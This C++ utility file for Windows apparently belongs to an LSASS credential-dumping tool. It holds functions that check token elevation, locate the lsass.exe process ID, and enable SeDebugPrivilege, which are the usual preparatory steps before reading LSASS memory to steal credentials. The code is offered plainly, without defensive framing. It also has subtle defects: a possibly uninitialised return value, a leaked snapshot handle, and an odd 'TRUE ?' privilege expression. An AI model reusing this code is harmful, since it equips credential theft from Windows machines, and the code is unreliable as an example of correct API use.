#include "utils.h"

bool IsElevated()
{
    bool elevated;
    HANDLE token = NULL;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elevation;
        DWORD token_check = sizeof(TOKEN_ELEVATION);

        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &token_check)) {
            elevated = elevation.TokenIsElevated;
        }
    }

    if (token) {
        CloseHandle(token);
    }

    return elevated;
}

DWORD getLsassPid()
{
    DWORD processPID = 0;
    HANDLE snap_handler = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    bool pRes = false;
    PROCESSENTRY32 processEntry = {};
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    LPCWSTR processName = L"";
    const wchar_t* lsass_processname = L"lsass.exe";

    pRes = Process32First(snap_handler, &processEntry);
    while (pRes != 0) {
        if (wcscmp(lsass_processname, processEntry.szExeFile) == 0) {
            processPID = processEntry.th32ProcessID;
        }
        pRes = Process32Next(snap_handler, &processEntry);
        
    }
    return processPID;
}

bool SetPrivilege()
{
    std::string priv_name = "SeDebugPrivilege";
    std::wstring privilege_name(priv_name.begin(), priv_name.end());
    const wchar_t* privName = privilege_name.c_str();

    TOKEN_PRIVILEGES priv = { 0,0,0,0 };
    HANDLE tokenPriv = NULL;
    LUID luid = { 0,0 };

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &tokenPriv) || !LookupPrivilegeValueW(0, privName, &luid)) {
        if (tokenPriv) {
            CloseHandle(tokenPriv);
        }
        return false;
    }

    priv.PrivilegeCount = 1;
    priv.Privileges[0].Luid = luid;
    priv.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : SE_PRIVILEGE_REMOVED;

    if (!AdjustTokenPrivileges(tokenPriv, false, &priv, 0, 0, 0)) {
        if (tokenPriv) {
            CloseHandle(tokenPriv);
        }
        return false;
    }
    return (true);
}